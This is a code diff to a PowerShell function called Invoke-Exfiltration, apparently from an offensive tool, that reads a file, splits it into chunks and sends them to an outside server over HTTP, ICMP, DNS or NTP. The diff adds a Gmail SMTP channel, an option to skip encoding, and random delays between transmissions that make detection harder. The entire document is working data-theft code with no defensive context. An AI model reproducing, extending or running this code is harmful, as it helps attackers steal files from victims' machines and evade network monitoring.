@@ -1,5 +1,5 @@
 function Invoke-Exfiltration {
-    param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns, [int] $sleep)
+    param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns, [int] $sleep, [string] $base64, [string] $gmailUser, [string] $gmailPass)
     $data = [System.IO.File]::ReadAllBytes($file)
     $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
     $hash = [System.BitConverter]::ToString($md5.ComputeHash($data))
@@ -133,6 +133,22 @@ function Invoke-Exfiltration {
         $data = $jobid + '|!|' + $i + '|!|DONE'
         $q = Send-ICMPPacket $data
     }
+	ElseIf ($type -eq 'gmail') {
+        $q = Send-Mail $data
+        for($i=0; $i-lt($repeat); $i++){
+            $str = $string.Substring($i * $Split, $Split);
+            $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
+            $q = Send-Mail $data
+        }
+        if($remainder){
+            $str = $string.Substring($len-$remainder);
+            $data = $jobid + '|!|' + $i + '|!|' + 'I' + '|!|' + $str
+            $q = Send-Mail $data
+            $i++
+        }
+        $data = $jobid + '|!|' + $i + '|!|DONE'
+        $q = Send-Mail $data
+    }
     ElseIf ($type -eq 'NTP') {
         $q = Send-NTPPacket $register1
         $q = Send-NTPPacket $register2
@@ -156,7 +172,13 @@ function Invoke-Exfiltration {
 
 function Send-HTTPRequest {
     param ([string] $data)
-    $data = Base64 $data;
+    If ($base64 -eq 'no') {
+    }
+
+    Else {
+        $data = Base64 $data;
+    }
+
     $url = "http://" + $server + ":" + $port + "/" + $data;
     Invoke-WebRequest $url
     If (!$sleep) {
@@ -167,7 +189,13 @@ function Send-HTTPRequest {
 
 function Send-ICMPPacket {
     param ([string] $data)
-    $data = Base64 $data;
+    If ($base64 -eq 'no') {
+    }
+
+    Else {
+        $data = Base64 $data;
+    }
+
     $IPAddress = $server 
     $ICMPClient = New-Object System.Net.NetworkInformation.Ping
     $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
@@ -200,6 +228,23 @@ function Send-DNSRequest {
         $str = $jobid + $str + '.' + $dns;
         $q = Resolve-DnsName -Type A -Server $server -Name $str -QuickTimeout -ErrorAction SilentlyContinue
     }
+    If (!$sleep) {
+        $sleep = Get-Random -minimum 0 -maximum 8; 
+    }
+    Start-Sleep -s $sleep;
+}
+
+function Send-Mail {
+    param ([string] $data)
+    If ($base64 -eq 'no') {
+    }
+
+    Else {
+        $data = Base64 $data;
+    }
+      
+    $cred = new-object Management.Automation.PSCredential $gmailUser, ($gmailPass | ConvertTo-SecureString -AsPlainText -Force)
+    Send-MailMessage -To $gmailUser -From $gmailUser -UseSsl -SmtpServer smtp.gmail.com -Credential $cred -Subject Incoming:Data -Body $data
     If (!$sleep) {
         $sleep = Get-Random -minimum 0 -maximum 8; 
     }
